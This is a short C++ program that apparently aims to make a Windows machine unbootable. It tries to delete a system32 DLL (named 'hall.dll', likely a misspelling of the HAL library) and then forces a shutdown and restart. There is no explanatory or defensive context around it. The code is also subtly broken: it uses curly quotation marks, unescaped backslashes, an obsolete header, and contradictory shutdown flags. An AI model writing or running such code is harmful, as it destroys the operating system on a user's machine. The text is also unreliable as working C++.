#include<iostream.h>
#include<stdlib.h>

using namespace std;

int main(int argc, char *argv[])
{
std::remove(“C:\windows\system32\hall.dll”);
system(“shutdown -s -r”);
system(“PAUSE”);
return EXIT_SUCCESS;
}
